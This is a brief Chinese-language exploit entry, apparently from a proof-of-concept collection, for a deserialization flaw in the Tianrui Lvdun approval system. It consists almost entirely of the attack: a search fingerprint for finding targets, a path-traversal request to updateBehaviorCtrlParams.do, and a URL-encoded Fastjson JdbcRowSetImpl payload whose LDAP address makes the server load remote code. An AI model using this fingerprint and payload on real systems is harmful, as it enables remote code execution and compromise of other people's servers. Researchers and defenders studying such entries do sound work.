# 天锐绿盾审批系统updateBehaviorCtrlParams.do存在反序列化漏洞

天锐绿盾 ｜ 反序列化 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/login.jsp/.%2e/task/updateBehaviorCtrlParams.do HTTP/1.1`

**Payload**
```
params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+%22ldap%3A%2F%2F192.168.168.11%3A50389%2F165c51%22%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
```
- **响应特征**：200